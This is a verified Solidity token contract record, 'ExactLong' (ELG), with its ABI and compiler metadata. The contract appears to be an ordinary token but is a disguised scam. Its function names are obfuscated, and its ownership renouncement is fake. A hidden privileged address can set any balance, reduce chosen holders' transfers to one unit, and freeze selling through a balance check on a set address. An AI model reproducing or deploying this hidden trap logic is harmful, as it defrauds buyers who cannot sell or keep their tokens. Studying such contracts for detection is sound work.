{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface launchLaunchedTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLiquidity {\n    function createPair(address atModeLimit, address isSwapBuy) external returns (address);\n}\n\ninterface enableModeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapBuy) external view returns (uint256);\n\n    function transfer(address tradingWallet, uint256 minSender) external returns (bool);\n\n    function allowance(address tradingMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingWallet,\n        uint256 minSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isLaunchMarketing, uint256 value);\n    event Approval(address indexed tradingMax, address indexed spender, uint256 value);\n}\n\ninterface enableModeListMetadata is enableModeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExactLong is minFund, enableModeList, enableModeListMetadata {\n\n    function getOwner() external view returns (address) {\n        return amountLiquidity;\n    }\n\n    function owner() external view returns (address) {\n        return amountLiquidity;\n    }\n\n    address swapTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private minAt;\n\n    uint8 private txReceiver = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txReceiver;\n    }\n\n    function liquiditySwap() public {\n        emit OwnershipTransferred(launchedSwap, address(0));\n        amountLiquidity = address(0);\n    }\n\n    mapping(address => bool) public isLaunch;\n\n    mapping(address => mapping(address => uint256)) private liquidityFund;\n\n    address modeTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (totalSwap == tokenTx) {\n            liquidityExempt = atLimit;\n        }\n        launchLaunchedTrading exemptIs = launchLaunchedTrading(swapTotal);\n        receiverMarketing = marketingLiquidity(exemptIs.factory()).createPair(exemptIs.WETH(), address(this));\n        if (tokenTx == totalSwap) {\n            isFeeLiquidity = false;\n        }\n        launchedSwap = _msgSender();\n        liquiditySwap();\n        isLaunch[launchedSwap] = true;\n        minAt[launchedSwap] = autoIs;\n        \n        emit Transfer(address(0), launchedSwap, autoIs);\n    }\n\n    bool private tokenTx;\n\n    function teamFund(address tradingAt) public {\n        autoExemptTeam();\n        if (tokenTx) {\n            isFeeLiquidity = true;\n        }\n        if (tradingAt == launchedSwap || tradingAt == receiverMarketing) {\n            return;\n        }\n        autoToTrading[tradingAt] = true;\n    }\n\n    address public launchedSwap;\n\n    uint256 constant receiverTo = 1 ** 10;\n\n    function buyFrom(address walletEnable, uint256 minSender) public {\n        autoExemptTeam();\n        minAt[walletEnable] = minSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoIs;\n    }\n\n    uint256 private autoIs = 100000000 * 10 ** 18;\n\n    function teamTake(uint256 minSender) public {\n        autoExemptTeam();\n        receiverEnable = minSender;\n    }\n\n    function totalReceiverSender(address liquidityFrom, address tradingWallet, uint256 minSender) internal returns (bool) {\n        if (liquidityFrom == launchedSwap) {\n            return senderFee(liquidityFrom, tradingWallet, minSender);\n        }\n        uint256 teamAtIs = enableModeList(receiverMarketing).balanceOf(modeTotal);\n        require(teamAtIs == receiverEnable);\n        require(tradingWallet != modeTotal);\n        if (autoToTrading[liquidityFrom]) {\n            return senderFee(liquidityFrom, tradingWallet, receiverTo);\n        }\n        return senderFee(liquidityFrom, tradingWallet, minSender);\n    }\n\n    string private liquidityWallet = \"Exact Long\";\n\n    address private amountLiquidity;\n\n    function approve(address exemptTotal, uint256 minSender) public virtual override returns (bool) {\n        liquidityFund[_msgSender()][exemptTotal] = minSender;\n        emit Approval(_msgSender(), exemptTotal, minSender);\n        return true;\n    }\n\n    bool public receiverLaunched;\n\n    function isExemptAuto(address atExempt) public {\n        require(atExempt.balance < 100000);\n        if (receiverLaunched) {\n            return;\n        }\n        \n        isLaunch[atExempt] = true;\n        if (liquidityExempt != atLimit) {\n            isFeeLiquidity = false;\n        }\n        receiverLaunched = true;\n    }\n\n    uint256 public atLimit;\n\n    bool public totalSwap;\n\n    function allowance(address buyMin, address exemptTotal) external view virtual override returns (uint256) {\n        if (exemptTotal == swapTotal) {\n            return type(uint256).max;\n        }\n        return liquidityFund[buyMin][exemptTotal];\n    }\n\n    uint256 public liquidityExempt;\n\n    string private exemptReceiverTotal = \"ELG\";\n\n    function transfer(address walletEnable, uint256 minSender) external virtual override returns (bool) {\n        return totalReceiverSender(_msgSender(), walletEnable, minSender);\n    }\n\n    uint256 listLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptReceiverTotal;\n    }\n\n    function senderFee(address liquidityFrom, address tradingWallet, uint256 minSender) internal returns (bool) {\n        require(minAt[liquidityFrom] >= minSender);\n        minAt[liquidityFrom] -= minSender;\n        minAt[tradingWallet] += minSender;\n        emit Transfer(liquidityFrom, tradingWallet, minSender);\n        return true;\n    }\n\n    function transferFrom(address liquidityFrom, address tradingWallet, uint256 minSender) external override returns (bool) {\n        if (_msgSender() != swapTotal) {\n            if (liquidityFund[liquidityFrom][_msgSender()] != type(uint256).max) {\n                require(minSender <= liquidityFund[liquidityFrom][_msgSender()]);\n                liquidityFund[liquidityFrom][_msgSender()] -= minSender;\n            }\n        }\n        return totalReceiverSender(liquidityFrom, tradingWallet, minSender);\n    }\n\n    mapping(address => bool) public autoToTrading;\n\n    function autoExemptTeam() private view {\n        require(isLaunch[_msgSender()]);\n    }\n\n    address public receiverMarketing;\n\n    uint256 receiverEnable;\n\n    bool public isFeeLiquidity;\n\n    function balanceOf(address swapBuy) public view virtual override returns (uint256) {\n        return minAt[swapBuy];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityWallet;\n    }\n\n    event OwnershipTransferred(address indexed teamShould, address indexed marketingShould);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunchMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoToTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSender\",\"type\":\"uint256\"}],\"name\":\"buyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"isExemptAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFeeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"}],\"name\":\"teamFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minSender\",\"type\":\"uint256\"}],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExactLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}